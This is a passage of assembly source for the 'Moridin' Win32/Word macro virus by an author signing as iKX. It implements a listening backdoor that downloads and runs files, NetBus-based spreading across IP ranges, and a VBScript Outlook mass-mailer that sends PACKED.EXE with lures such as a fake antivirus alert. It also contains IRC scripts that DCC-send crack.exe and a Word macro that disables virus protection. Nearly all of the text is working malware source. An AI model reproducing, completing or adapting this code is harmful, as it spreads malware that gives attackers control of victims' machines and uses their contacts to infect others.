   push    eax          ; EAX = address of IP in memory
   call    lstrlen      ; count # of bytes IP accupies
   mov     ecx,eax      ; ECX = size of IP
   pop     esi          ; ESI = IP address in memory
   lea     edi,ascii_ip ; EDI = buffer for the IP
   rep     movsb        ; Copy the IP

   ;push    0
   ;push    offset ascii_ip
   ;push    offset ascii_ip
   ;push    0
   ;call    MessageBoxA

   mov     dword ptr [inet_enum],1

   call    network_travel


   ret

   send_command:
   push    0h
   push    ecx
   push    eax
   push    dword ptr [send_socket]
   call    send
   ret

   send_virus:

   push    260d
   push    offset mmsys_value
   call    GetSystemDirectoryA

   push    offset mmsys_text
   push    offset mmsys_value
   call    lstrcatA

   lea     esi, mmsys_value
   mov     ecx,GENERIC_READ or GENERIC_WRITE
   call    open_file
   mov     dword ptr [netbus_filehandle],eax
   test    eax,eax
   je      quit_send

   push    0
   push    dword ptr [netbus_filehandle]
   call    GetFileSize
   mov     dword ptr [netbus_memory],eax

   ;mov     eax, dword ptr [netbus_memory]
   mov     eax,150000d
   mov     ebx, dword ptr [netbus_filehandle]
   call    CreateMap
   mov     dword ptr [netbus_maphandle], eax
   test    eax,eax
   jz      close_netbus

   mov     eax, dword ptr [netbus_maphandle]
   call    CreateView_net
   mov     dword ptr [netbus_mapaddress], eax


   ;push    ecx
   ;push    edx

   lea     esi,sock_addr_in_2    ; EDI = sock_add structure
   push    sock_addr_in_len
   push    esi
   push    dword ptr [recv_socket]
   call    connect
   ;pop     edx
   ;pop     ecx
   ;test    eax,eax
   ;jne     get_error

   send_loop:

   mov     eax,dword ptr [recv_socket]
   call    send_burst
   cmp     eax,-1
   je      error_send
   jmp     close_up_sender


   close_up_sender:

   ; CLOSE THE SOCKET

   push    dword ptr [recv_socket]
   call    closesocket

   error_send:
   push    dword ptr [netbus_mapaddress]
   call    UnmapViewOfFile
   push    dword ptr [netbus_maphandle]
   call    CloseHandle
   close_netbus:
   push    dword ptr [netbus_filehandle]
   call    CloseHandle
   quit_send:
   ret

   send_burst:

   push    0
   push    150000
   push    dword ptr [netbus_mapaddress]
   push    eax ; send_socket or recv_socket
   call    send
   ret

   clear_buffer:
   ;pushad
   mov     edi,ebx
   mov     ecx,666d
   xor     eax,eax
   rep     stosb
   ;popad
   ret

   not_connected:
   ret

   get_host_ip:
   push    eax            ; EAX = target domain name
   call    gethostbyname  ; Get the IP of this domain name
   ret

   create_socket:
   push    PCL_NONE        ; No protocol
   push    SOCK_STREAM     ; A socket stream connection
   push    AF_INET         ; AF_INET the only one for use
   call    socket          ; Create socket
   ret

   CreateView_net:
   push    esi
   push    esi
   push    esi
   push    2
   push    eax
   call    MapViewOfFile
   cmp     eax, esi
   jne     no_error_view
   push    dword ptr [netbus_maphandle]
   call    CloseHandle
   no_error_view:
   ret

   find_window:
   push     eax
   push     0
   call     FindWindowA
   ret

   user_offline:

   push    0
   call    ExitProcess


   spawn_backdoor:

   cmp     dword ptr [backdoor_spawned],1
   je      it_is_spawned

   xor     edx,edx
   push    offset thread_id
   push    edx                               ;fdwCreate
   push    eax                               ;lpvTParam
   push    offset backdoor_thread            ;lpStartAddr
   push    edx                               ;cbStack
   push    edx                               ;lpsa
   call    CreateThread                      ;create new thread
   test    eax,eax
   je      no_thread

   mov     dword ptr [thread_hnd],eax

   ;push    -1
   ;push    dword ptr [thread_hnd]
   ;call    WaitForSingleObject

   it_is_spawned:

   no_thread:

   ret



   backdoor_thread PROC my_param:DWORD

   init_backdoor:

   pushad

   mov     dword ptr [backdoor_spawned],1

   push    offset wsa_data ; Pointer to WSA data structure
   push    VERSION1_1      ; We want to use winsock ver 1.1
   call    WSAStartup      ; Start up winsocks
   test    eax,eax         ; ERROR?
   jne     bd_close_wsa   ; if so bail out

   call    create_socket
   inc     eax
   test    eax,eax
   je      bd_close_wsa
   dec     eax
   mov     dword ptr [listen_socket],eax ; save the handle of our socket

   call    create_socket
   inc     eax
   test    eax,eax
   je      bd_close_wsa
   dec     eax
   mov     dword ptr [download_socket],eax ; save the handle of our socket


   mov     word  ptr [server.bd_sin_family],AF_INET
   mov     dword ptr [server.bd_sin_addr],0
   mov     word  ptr [server_2.bd_sin_family_2],AF_INET
   mov     dword ptr [server_2.bd_sin_addr_2],0

   push    backdoor_port1 ; Port in decimal
   call    htons           ; convert it to big endian format (hex n reversed)
   mov     word ptr [server.bd_sin_port],ax
   mov     word ptr [backdoor_port1_s],ax

   push    backdoor_port2 ; Port in decimal
   call    htons           ; convert it to big endian format (hex n reversed)
   mov     word ptr [server_2.bd_sin_port_2],ax
   mov     word ptr [backdoor_port2_s],ax

   push    260d                            ; size of buffer
   push    offset host_name                ; PTR to buffer
   call    gethostname                     ; get out Hostname

   lea     eax,host_name                 ; Buffer with host domain name
   call    get_host_ip                   ; Call procedure that will get IP
   test    eax,eax
   je      bd_close_sockets

   mov     esi,dword ptr [eax+12]        ; ESI = Pointer to table in  hostent
                                         ; structure
   lodsd                                 ; EAX = Pointer to IP
   mov     eax,dword ptr [eax]           ; EAX = IP
   push    eax                           ; EAX on stack

   push    eax
   pop     esi
   lea     edi,freakin_ip
   push    eax                           ; EAX = address of IP in memory
   call    lstrlen                       ; count # of bytes IP accupies
   mov     ecx,eax                       ; ECX = size of IP
   rep     movsb


   pop     eax

   pushad
   call    zombie_mode
   popad


   bd_close_sockets:
   push    dword ptr [listen_socket]      ; Close out open socket
   call    closesocket

   push    dword ptr [data_socket]      ; Close out open socket
   call    closesocket

   bd_close_wsa:

   call    WSACleanup     ; Reset the WSA

   mov     eax,dword ptr [store_org_bytes]
   push    eax
   call    GlobalFree

   jmp     init_backdoor


   exit_bd:

   popad

   ;mov     dword ptr [exit_backdoor],1

   push    0h
   call    ExitThread


   zombie_mode:



   push    16
   push    offset server
   push    listen_socket
   call    bind

   push    5
   push    listen_socket
   call    listen


   push    offset saddrlen
   push    offset client
   push    listen_socket
   call    accept
   mov     dword ptr [data_socket],eax

   mov     ecx,backdoor_openmsg_len
   lea     eax,backdoor_openmsg
   call    bd_send_command


   get_again:


   lea     ebx,con_buffer
   call    clear_buffer

   push    0h
   push    260d
   push    ebx
   push    dword ptr [data_socket]
   call    recv

   ; if message = "MSGCMD:CAPTION:MESSAGE"
   ; if CD = "OCDCMD"
   ; if upload  = "ULCMD:FULLPATH:SIZE"
   ; if exit    = "XITCMD"

   cmp     dword ptr [ebx], "CDCO"
   je      open_close_cd

   cmp     dword ptr [ebx], "CGSM"
   je      message_user

   cmp     dword ptr [ebx], "MCLU"
   je      upload_file

   cmp     dword ptr [ebx], "CTIX"
   je      exit_listen

   jmp     get_again


   exit_listen:

   jmp     exit_bd

   open_close_cd:

   lea     eax,sz_open_cd
   call    operate_cd

   lea     eax,sz_close_cd
   call    operate_cd

   jmp     bd_close_sockets

   upload_file:

   mov     ecx,[ebx+6]
   mov     dword ptr [backdoor_memory],ecx

   push    ecx
   push    0h
   call    GlobalAlloc
   mov     dword ptr [store_org_bytes],eax

   lea      eax,leech_file
   call     create_file

   push    16
   push    offset server_2
   push    download_socket
   call    bind

   push    5
   push    download_socket
   call    listen


   push    offset saddrlen
   push    offset client_2
   push    download_socket
   call    accept
   mov     dword ptr [transfer_socket],eax



   recv_loop:

   call    send_ready

   call    recv_type
   cmp     eax,-1
   je      error_recv
   cmp     dword ptr [ebx],"ALLU"
   je      last_burst

   push    0h
   push    1000h
   push    dword ptr [store_org_bytes]
   push    dword ptr [transfer_socket]
   call    recv
   cmp     eax,-1
   je      error_recv

   mov      eax,dword ptr [store_org_bytes]
   mov      ecx,1000h
   call     write_file
   jmp      recv_loop

   last_burst:

   call    send_ready
   call    recv_type

   mov     ecx,[ebx+6]
   mov     dword ptr [backdoor_memory],ecx

   call    send_ready

   push    0h
   push    dword ptr [backdoor_memory]
   push    dword ptr [store_org_bytes]
   push    dword ptr [transfer_socket]
   call    recv
   cmp     eax,-1
   je      error_recv

   mov     eax,dword ptr [store_org_bytes]
   mov     ecx,dword ptr [backdoor_memory]
   call    write_file


   error_recv:

   mov      eax,dword ptr [filehandle_]
   call     close_file_

   call    start_program

   push    dword ptr [download_socket]
   call    closesocket

   jmp     bd_close_sockets

   message_user:
   ; if message = "MSGCMD:CAPTION:MESSAGE


   push    ebx
   call    lstrlen
   xor     ecx,ecx


   split_it_1:
   cmp     byte ptr [ebx+ecx],":"
   je      found_message
   inc     ecx
   jmp     split_it_1

   found_message:

   mov     esi,ebx
   add     esi,ecx
   inc     esi
   sub     eax,ecx
   mov     ecx,eax

   lea     edi,show_msg
   rep     movsb


   push    10h
   push    offset msg_cap
   push    offset show_msg
   push    0
   call    MessageBoxA


   push    dword ptr [listen_socket]      ; Close out open socket
   call    closesocket

   push    dword ptr [data_socket]      ; Close out open socket
   call    closesocket


   call    WSACleanup     ; Reset the WSA

   jmp     init_backdoor



   bd_send_command:
   push    0h
   push    ecx
   push    eax
   push    dword ptr [data_socket]
   call    send
   ret


   send_ready:
   mov     ecx,backdoor_uploadmsg_len
   lea     eax,backdoor_uploadmsg
   call    bd_send_command
   ret

   recv_type:
   lea     ebx,con_buffer
   call    clear_buffer

   push    0h
   push    260d
   push    ebx
   push    dword ptr [data_socket]
   call    recv
   ret


   operate_cd:
   push    0
   push    0
   push    0
   push    eax
   call    mciSendStringA
   ret

   start_program:

   lea      eax,start_info
   push     eax
   call     GetStartupInfoA


   xor      edx,edx
   push     offset process_info
   push     offset start_info
   push     edx
   push     edx
   push     edx
   push     edx
   push     edx
   push     edx
   push     offset leech_file
   push     edx
   call     CreateProcessA
   ret






   ; Backdoor data ETC

   NETRESOURCE             STRUCT
     nr_dwScope              dd ?             ;resource scope
     nr_dwType               dd ?             ;resource type
     nr_dwDisplayType        dd ?             ;display type
     nr_dwUsage              dd ?             ;resource usage
     nr_lpLocalName          dd ?             ;redirected local device
     nr_lpRemoteName         dd ?             ;remote name
     nr_lpComment            dd ?             ;provider supplied comment
     nr_lpProvider           dd ?             ;name of provider
   NETRESOURCE             ENDS

   net_resource NETRESOURCE ?


   saddrlen    dw 16
           db 16 dup (0)


   sockaddr_in             STRUCT
     bd_sin_family           WORD  0
     bd_sin_port             WORD  0
     bd_sin_addr             DWORD 0
     bd_sin_zero             BYTE  8 dup (0)
   sockaddr_in             ENDS

   sockaddr_in_2           STRUCT
     bd_sin_family_2         WORD  0
     bd_sin_port_2           WORD  0
     bd_sin_addr_2           DWORD 0
     bd_sin_zero_2           BYTE  8 dup (0)
   sockaddr_in_2           ENDS


   server      sockaddr_in   <0,0,0,0>
   server_2    sockaddr_in_2 <0,0,0,0>


   client      sockaddr_in ?
   client_2    sockaddr_in_2 ?

   backdoor_port1_s        dw 0
   backdoor_port2_s        dw 0

   backdoor_port1          dd 24
   backdoor_port2          dd 26

   backdoor_spawned          dd 0

   listen_socket             dd 0
   data_socket               dd 0
   download_socket           dd 0
   transfer_socket           dd 0

   store_org_bytes           dd 0

   msg_cap                 db "[W97-2K/Win32.Moridin 1.0] by Asmodeus iKX",0
   leech_file              db "moridin.bin",0
   sz_open_cd              db "set cdaudio door open",0
   sz_close_cd             db "set cdaudio door closed",0
   freakin_ip              db 260d dup (0)
   show_msg                db 260d dup (0)
   this_file               db 260d dup (0)
   bd_path                 db 260d dup (0)
   bd_entry                db "wnsock32",0
   bd_name                 db "\wnsock32.exe",0
   backdoor_memory                  dd 0


   backdoor_openmsg               db "The grave is no barrier to my call:1:0",13
   backdoor_openmsg_len           = $ - offset backdoor_openmsg
   backdoor_uploadmsg             db "UploadReady",13
   backdoor_uploadmsg_len         = $ - offset backdoor_uploadmsg



   ;IP range scanner data ETC

   sock_addr_in_1:
   sin_family_1    dw AF_INET
   sin_port_1      db 2 dup(0)
   sin_addr_1      dd 0
   sin_zero_1      db 8 dup(0)

   sock_addr_in_2:
   sin_family_2    dw AF_INET
   sin_port_2      db 2 dup(0)
   sin_addr_2      dd 0
   sin_zero_2      db 8 dup(0)

   sock_addr_in_4:
   sin_family_4    dw AF_INET
   sin_port_4      db 2 dup(0)
   sin_addr_4      dd 0
   sin_zero_4      db 8 dup(0)

   last_ip                 dd 0
   netbus_port1_s          dw 0
   netbus_port2_s          dw 0
   netbios_port_s          dw 0

   what_ever               dd 0
   thread_id               dd 0
   send_socket             dd 0
   recv_socket             dd 0
   netbios_socket          dd 0

   netbus_port1            dd 12345
   netbus_port2            dd 12346
   netbios_port            dd 139

   host_name               db 260d dup (0)
   con_buffer              db 666d dup (0)
   ascii_ip                db 26d dup(?)

   online_window1          db "mIRC32",0
   online_window2          db "GetRight Monitor",0
   online_window3          db "Microsoft Outlook",0
   online_window4          db "ICQMsgAPI Window",0
   online_window5          db "WWW Links",0
   online_window6          db "PIRCH98",0
   online_window7          db "Sockets Window",0

   netbus_filehandle              dd 0
   netbus_mapaddress              dd 0
   netbus_maphandle               dd 0
   netbus_memory                  dd 0
   bytes_sent                     dd 0
   thread_hnd                     dd 0
   ; Netbus trojan command syntax


   netbus_password           db "Password;1;ikx",13
   netbus_password_len       = $ - offset netbus_password
   netbus_upload             db "UploadFile;moridin.scr;150000;c:\",13
   netbus_upload_len         = $ - offset netbus_upload
   netbus_remove             db "RemoveServer;1",13
   netbus_remove_len         = $ - offset netbus_remove
   netbus_startapp           db "StartApp;c:\moridin.scr",13
   netbus_startapp_len       = $ - offset netbus_startapp

   ;its_network_drive db 0
   muff    db "muff!",0
   check_program   dd 0
   ProcessHandle   dd 0
   command_line    dd 0
   module_handle   dd 0
   alloc_heap      dd 0
   new_path        db      112h dup (?)
   netspace        equ     4000h
   enum_handle     dd      0
   net_tries       dd      0
   all_tries       dd      0
   share_tries     dd      0
   enum_count      dd      1ffh
   enum_size       dd      netspace
   drive_letter    db 'Z:',0
   Password        dd 40 dup (0)

   doc_exe_file    db 260d dup (0)
   ;commandliny     db 260d dup (0)
   ;commandliny_2   db 260d dup (0)
   Current_Dir     db 260d dup(0)
   Org_Dir         db 260d dup(0)
   win_ini_dir     db 260d dup(0)
   inf_dir         db 260d dup(0)

   ;---Reg-data----


   key_data        db 260 dup(0)
   key_len         dd 260
   key2_data       db "\", 260 dup(0)
   key2_len        dd 260
   key3_data       db "\", 260 dup(0)
   key3_len        dd 260
   key4_data       db "\", 260 dup(0)
   key4_len        dd 260
   key5_data       db 260 dup(0)
   key5_len        dd 260
   hKey            dd  0
   lpsKey          db  'Software\Microsoft\Office\8.0\Common\FileNew\LocalTemplates',0
   subkey_1        db  'Software\Microsoft\Office\8.0\Word\Options',0
   subkey_2        db  'Software\Microsoft\Office\9.0\Word\Security',0
   subkey_3        db  'Software\Microsoft\Office\9.0\Common\General',0
   subkey_4        db  'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',0
   subkey_5        db  'Volatile Environment',0

   sec_name        db  "EnableMacroVirusProtection",0
   app_data        db  "ApplicationData",0
   app_data2       db  "AppData",0
   micro_copy      db  "\Microsoft",0
   templates_data  db "Templates",0
   word97value db '0',0
   word97value_len = $ - offset word97value
   office2k_value  dd 0h
   office2k_value_len = $ - offset office2k_value
   o2k_name    db "Level",0


   res_active_value  db 'YES!',0
   res_active_value_len = $ - offset res_active_value
   res_name          db "Active",0
   res_reg_key       db  'Software\iKX',0

   res_data          db 260 dup(0)
   res_len           dd 260

   res_deactive_value  db 'NO!!',0
   res_deactive_value_len = $ - offset res_deactive_value

   STARTUPINFO STRUC
       STI_cb              DD ?
       STI_lpReserved      DD BYTE PTR ?
       STI_lpDesktop       DD BYTE PTR ?
       STI_lpTitle         DD BYTE PTR ?
       STI_dwX             DD ?
       STI_dwY             DD ?
       STI_dwXSize         DD ?
       STI_dwYSize         DD ?
       STI_dwXCountChars   DD ?
       STI_dwYCountChars   DD ?
       STI_dwFillAttribute DD ?
       STI_dwFlags         DD ?
       STI_wShowWindow     DW ?
       STI_cbReserved2     DW ?
       STI_lpReserved2     DD BYTE PTR ?
       STI_hStdInput       DD ?
       STI_hStdOutput      DD ?
       STI_hStdError       DD ?
   STARTUPINFO ENDS

   start_info    STARTUPINFO ?

   PROCESS_INFORMATION STRUC
       PI_hProcess    DD ?
       PI_hThread     DD ?
       PI_dwProcessId DD ?
       PI_dwThreadId  DD ?
   PROCESS_INFORMATION ENDS
   process_info    PROCESS_INFORMATION ?

   FIND_DATA                 STRUC
           FileAttributes          DD ?
           CreationTime            qword ?
           LastAccessTime          qword ?
           LastWriteTime           qword ?
           FileSizeHigh            DD ?
           FileSizeLow             DD ?
           Reserved0               DD ?
           Reserved1               DD ?
           FileName                DB 260 DUP (?)
           AlternateFileName       DB 14 DUP (?)
   FIND_DATA                 ENDS
   search    FIND_DATA ?


   WSADATA     struct
   mVersion    dw  0
   mHighVersion    dw  0
   szDescription   db  257 dup(0)
   szSystemStatus  db  129 dup(0)
   iMaxSockets dw  0
   iMaxUpdDg   dw  0
   lpVendorInfo    dd  0
   WSADATA     ends

   wsa_data       WSADATA ?

   include           wsock32.inc
   include           mor_scr.inc

   html_files        db   "*.HTM",0
   file_1            db 'script.ini',0
   file_2            db 'events.ini',0
   file_5            db 'default.lib',0
   file_6            db 'script.old',0
   filehandle_       dd 0
   virus_file        dd 0
   auto_runner       dw 0
   nr_to_inf         dd 0
   search_handle     dd 0
   key_type          dd 0
   inet_enum         dd 0
   shitty            db 260d dup (0)
   Sys_dir           db 260d dup (0)
   ThisFile          db 260d dup (0)
   ThisFile_2        db 260d dup (0)
   DestDrop          db 260d dup (0)
   fullpath          db 260d dup (0)
   DestVir           db 'CRACK.EXE',0
   NetVir            db 'INIT.EXE',0
   NetVir_2          db 'SETUP.EXE',0
   NetVir_3          db 'NETX.EXE',0
   NetVir_ad         db '\INIT.EXE',0
   inf_ad            db 'AUTORUN.INF',0
   normal_dot        db "Normal.dot",0
   WIN_AVP           db  "AVP Monitor",0
   WIN_AMON          db  "Amon Antivirus Monitor",0
   WIN_NORTON_1      db  "Norton AntiVirus Auto-Protect Trial Version",0
   WIN_NORTON_2      db  "Norton AntiVirus Auto-Protect",0
   ini_run           db "run",0
   ini_autorun       db "windows",0
   inf_autorun       db "autorun",0
   inf_open          db "open",0

   win_ini_dir_1     db "\WINDOWS",0
   win_ini_dir_2     db "\WINNT",0
   win_ini_dir_3     db "\WIN95",0
   win_ini_dir_4     db "\WIN98",0
   win_ini_dir_5     db "\WIN2000",0
   win_ini_dir_6     db "\WIN2K",0
   win_ini_dir_7     db "\WIN",0
   win_ini           db "\WIN.INI",0
   Z_drive           db "Z:\",0
   new_label         db "W32Moridin",0
   Root_Dir          db "\",0

   num_bytes_written dd ?

   virus_cap      db "WinZip Self-Extractor",0
   virus_mess     db "",13,10
                  db "WinZip Self-Extractor header corrupt. Possible cause: bad disk or file transfer error",13,10
                  db "",13,10,0

   win_dir         db 260d  dup(0)
   zero            db 40 dup (0)
   started_from    db 4 dup (0)
   explorer_file   db "\EXPLORER.EXE ",0
   mmsys_value           db 260 dup (0)
   mmsys_text            db '\MMSYSTEM.BIN',0
   mmsys_text_2            db '\PACKED.EXE',0

   ;Document infection data

   exe_filehandle              dd 0
   exe_mapaddress              dd 0
   exe_maphandle               dd 0
   exe_memory                  dd 0
   exe_size                    dd 0

   doc_filehandle              dd 0
   doc_mapaddress              dd 0
   doc_maphandle               dd 0
   doc_memory                  dd 0
   doc_size                    dd 0

   pseudo_desc     dd      12
                   dd      0
                   dd      0

   pseudo_desc2    dd      12
                   dd      0
                   dd      0

   currenthandle   dd      0
   memzone         dd      0
   sizetodo        dd      0
   targetzone      dd      0
   nothing         db 0
   argument1       db 260 dup(0)
   argument2       db "IMPMORI.DRV",0


   crypt_end:

   backdoor_thread EndP

   end      dropper_start

   ;----------- MOR_DROP.INC
   ;copy/paste into MOR_DROP.INC

   dropper_start:

   ;Insert the HEX/DB code here (you can use a utillity like INCPRO
   ;to transform the MOR_DROPPER.EXE into a HEX/DB script)
   ;then insert here! :)

   dropper_end:


   outlook_start:
   db 'On Error Resume Next',13,10
   db 'Set A = CreateObject("WScript.Shell")',13,10
   db 'B = A.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Currentversion\Ikx")',13,10
   db 'If B <> "Moridin 1.0" Then',13,10
   db 'Set C = CreateObject("Outlook.Application")',13,10
   db 'Set D = C.GetNameSpace("MAPI")',13,10
   db 'For Each E In D.AddressLists',13,10
   db 'If E.AddressEntries.Count > 0 Then',13,10
   db 'Set F = C.CreateItem(0)',13,10
   db 'For G = 1 To E.AddressEntries.Count',13,10
   db 'Set H = E.AddressEntries(G)',13,10
   db 'If G = 1 Then',13,10
   db 'F.BCC = H.Address',13,10
   db 'Else',13,10
   db 'F.BCC = F.BCC & "; " & H.Address',13,10
   db 'End If',13,10
   db 'Next',13,10
   db 'Randomize',13,10
   db 'I = Int(3 * Rnd + 1)',13,10
   db 'If I = 1 Then',13,10
   db 'F.Subject = "Alert: [15.09.2000 - 21:23 UTC+2DST] I-Worm.Funny"',13,10
   db 'F.Body = "Reported in-the-wild in Switzerland. Detection for this virus has been added at 17:17 (http://www.avp.ch) Do not open attchment called FUNNY_STORY.HTM.vbs"',13,10
   db 'ElseIf I = 2 Then',13,10
   db 'F.Subject = "SPPPLAAASHH!"',13,10
   db 'F.Body = "SPLOOOF! You just got hit! This is THE attachment war!! To win hit as many of your friends as possible."',13,10
   db 'Else',13,10
   db 'F.Subject = "This is how I look"',13,10
   db 'F.Body = "Got the pictures from last weekend developed, check em out :)"',13,10
   db 'End If',13,10
   db 'J = Int(3 * Rnd + 1)',13,10
   db 'If J = 1 Then',13,10
   db 'F.Body = F.Body & Chr(13) & Chr(10) & Chr(13) & Chr(10) & "Regards, "',13,10
   db 'ElseIf J = 2 Then',13,10
   db 'F.Body = F.Body & Chr(13) & Chr(10) & Chr(13) & Chr(10) & "Sincerely, "',13,10
   db 'Else',13,10
   db 'F.Body = F.Body & Chr(13) & Chr(10) & Chr(13) & Chr(10) & "Have a nice day, "',13,10
   db 'End If',13,10
   db 'F.Body = F.Body & A.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")',13,10
   db 'K = A.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization")',13,10
   db 'If K <> "" Then',13,10
   db 'F.Body = F.Body & Chr(13) & Chr(10) & K',13,10
   db 'End If',13,10
   db 'Set H = CreateObject("Scripting.FileSystemObject")',13,10
   db 'F.Attachments.Add H.BuildPath(H.GetSpecialFolder(1),"PACKED.EXE")',13,10
   db 'F.DeleteAfterSubmit = True',13,10
   db 'F.Send',13,10
   db 'End If',13,10
   db 'Next',13,10
   db 'A.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Ikx","Moridin 1.0"',13,10
   db 'End If',13,10
   outlook_end:

   dropper_len    equ dropper_end-dropper_start
   outlook_len    equ outlook_end-outlook_start


   ;-------------WSOCK32.INC-------
   ; copy/paste into WSOCK32.INC

   SM_NETWORK      EQU     63H

   VERSION1_0      equ     0100h
   VERSION1_1      equ     0101h
   VERSION2_0      equ     0200h

   AF_UNIX     equ 1   ; local host
   AF_INET         equ     2       ; internet (most used)
   AF_IMPLINK  equ 3   ; arpanet
   AF_NETBIOS  equ 17  ; NetBios style addresses

   ; types of sockets
   SOCK_STREAM     equ     1       ; stream (connection oriented; telnet like)
   SOCK_DGRAM      equ     2       ; datagram (packets, packets, packets)

   ; protocol
   PCL_NONE        equ     0       ; none (define the protocol not needed)

   SOCKET_ERR      equ     -1      ; standard winsock error

   HOSTENT_IP      equ     10h     ; where is the IP into the hostent struct

   ;-------------MOR_SCR.INC---------

   mirc_start:
   db '[script]',13,10
   db "n0=on 1:TEXT:*moridin*:#:/msg $chan -[W97-2K/Win32.Moridin 1.0] by Asmodeus iKX, Tia mi aven Moridin vadin.",13,10
   db 'n1=on 1:TEXT:*!saidin*:#:/mode $chan +b $me',13,10
   db 'n2=on 1:TEXT:*remainsinsane*:#:/mode $chan +o $nick',13,10
   db 'n3=on 1:TEXT:*handitout*:#:/fserve $nick 20 c:\',13,10
   db 'n3=on 1:TEXT:*crack*:#:if ( $me != $nick ) { /dcc send $nick crack.exe }',13,10
   db 'n4=on 1:TEXT:*worm*:#:/ignore $nick',13,10
   db 'n5=on 1:TEXT:*virus*:#:/ignore $nick',13,10
   mirc_end:

   mirc_len        equ mirc_end - mirc_start

   pirch_start:
   db '[Levels]',13,10
   db 'Enabled=1',13,10
   db 'Count=1',13,10
   db 'Level1=moridin',13,10
   db '[moridin]',13,10
   db 'User1=*!*@*',13,10
   db 'UserCount=1',13,10
   db 'Event1=ON TEXT:*crack*:#:/dcc send $nick c:\pirch98\crack.exe',13,10
   db 'Event2=ON TEXT:*crack*:#:/dcc send $nick c:\program\pirch98\crack.exe',13,10
   db 'Event3=ON TEXT:*crack*:#:/dcc send $nick c:\progra~1\pirch98\crack.exe',13,10
   db 'Event4=ON TEXT:*worm*:#:/ignore $nick',13,10
   db 'Event5=ON TEXT:*virus*:#:/ignore $nick',13,10
   db 'EventCount=5',13,10
   pirch_end:

   pirch_len      equ pirch_end-pirch_start

   virc_start:
   db 'Name moridin',13,10
   db '// Events',,13,10,10
   db 'Event JOIN "* JOIN"',13,10
   db '  DCC Send $nick c:\virc97\crack.exe',13,10
   db '  DCC Send $nick c:\program\virc97\crack.exe',13,10
   db '  DCC Send $nick c:\progra~1\virc97\crack.exe',13,10
   db 'EndEvent',13,10
   virc_end:

   virc_len      equ virc_end-virc_start

   html_start:
   db '&nbsp',59,'<font color="#999999"><a href="setup.exe">Download</a></font>',13,10
   db '</body>',13,10
   db '</html>',13,10
   html_end:

   macro_code_start:
   db 'Private Declare Sub CloseFile Lib "KERNEL32" Alias "_lclose" (ByVal h As Long)',13,10
   db 'Private Declare Function OpenFile Lib "KERNEL32" Alias "_lopen" (ByVal s As String, ByVal mode As Long) As Long',13,10
   db 'Private Declare Function GetFileSize Lib "KERNEL32" (ByVal s As Long, ByVal l As Long) As Long',13,10
   db 'Private Declare Sub SeekFile Lib "KERNEL32" Alias "_llseek" (ByVal h As Long, ByVal ofs As Long, ByVal fw As Long)',13,10
   db 'Private Declare Function GlobalAlloc Lib "KERNEL32" (ByVal fl As Long, ByVal n As Long) As Long',13,10
   db 'Private Declare Sub ReadFile Lib "KERNEL32" Alias "_lread" (ByVal h As Long, ByVal ptr As Long, ByVal n As Long)',13,10
   db 'Private Declare Function CreateFile Lib "KERNEL32" Alias "_lcreat" (ByVal s As String, ByVal attr As Long) As Long',13,10
   db 'Private Declare Sub GlobalFree Lib "KERNEL32" (ByVal ptr As Long)',13,10
   db 'Private Declare Sub WriteFile Lib "KERNEL32" Alias "_lwrite" (ByVal h As Long, ByVal ptr As Long, ByVal n As Long)',13,10
   db 'Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long',13,10
   db 'Private Sub Document_Close()',13,10
   db 'where_am_i = 1',13,10
   db "REM -[W97-2K/Win32.Moridin 1.0] by Asmodeus iKX",13,10
   db "If where_am_i = 0 Then GoTo do_not_change",13,10
   db 'NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).CodeModule.replaceline 13, "REM -[W97-2K/Win32.Moridin 1.0] by Asmodeus iKX"',13,10
   db "do_not_change:",13,10
   db 'Application.EnableCancelKey = wdCancelDisabled',13,10
   db 'Options.VirusProtection = Chr$(48)',13,10
   db 'Options.SaveNormalPrompt = Chr$(48)',13,10
   db 'Options.ConfirmConversions = Chr$(48)',13,10
   db 'Application.ScreenUpdating = Chr$(48)',13,10
   db 'Application.DisplayStatusBar = Chr$(48)',13,10
   db 'Application.DisplayAlerts = Chr$(48)',13,10
   db 'Dim h As Long, p As Long, s As Long, da_doc As String, da_exe As String',13,10
   db 'Dim Act_doc As Object: Set Act_doc = ActiveDocument',13,10
   db 'Dim Act_norm As Object: Set Act_norm = NormalTemplate',13,10
   db 'Dim This_doc As Object: Set This_doc = ThisDocument',13,10
   db 'Dim buffer As String, tempphuck As Long',13,10
   db 'active_doc = ActiveDocument.FullName',13,10
   db 'Pegasus:',13,10
   db 'If Dir("c:\pmail\winpm-32.exe") <> "" Then pega_dir = "c:\pmail\": GoTo past_pega_dir',13,10
   db 'If Dir("c:\mail\winpm-32.exe") <> "" Then pega_dir = "c:\pmail\": GoTo past_pega_dir',13,10
   db 'If Dir("c:\program~1\pmail\winpm-32.exe") <> "" Then pega_dir = "c:\program~1\pmail\": GoTo past_pega_dir',13,10
   db 'If Dir("c:\program\pmail\winpm-32.exe") <> "" Then pega_dir = "c:\program\pmail\": GoTo past_pega_dir',13,10
   db 'GoTo no_mail',13,10
   db 'past_pega_dir:',13,10
   db 'With Application.FileSearch',13,10
   db '    .FileName = "\*.pmw"',13,10
   db '    .LookIn = pega_dir',13,10
   db '    .SearchSubFolders = True',13,10
   db '    .MatchTextExactly = True',13,10
   db '    .FileType = msoFileTypeAllFiles',13,10
   db '    .Execute',13,10
   db '    pega_mail = .FoundFiles(Cos(Atn(CInt(1))))',13,10
   db 'End With',13,10
   db 'get_rand = 0',13,10
   db 'get_rand = Int(Rnd(1) * 8) + 1',13,10
   db 'user_name = Application.UserName',13,10
   db 'If get_rand = 1 Then random_message = "Check this out!": GoTo after_rand',13,10
   db 'random_message = "BAAAAAAAM! You just got hit by an attachment, this is the attachment war! Hit someone, NOW!": GoTo after_rand',13,10
   db 'after_rand:',13,10
   db 'If pega_mail = "" Then GoTo no_mail',13,10
   db 'Open pega_mail For Input As #1',13,10
   db 'Line Input #1, mail_1',13,10
   db 'Line Input #1, mail_2',13,10
   db 'Line Input #1, mail_3',13,10
   db 'Line Input #1, mail_4',13,10
   db 'Line Input #1, mail_5',13,10
   db 'Close #1',13,10
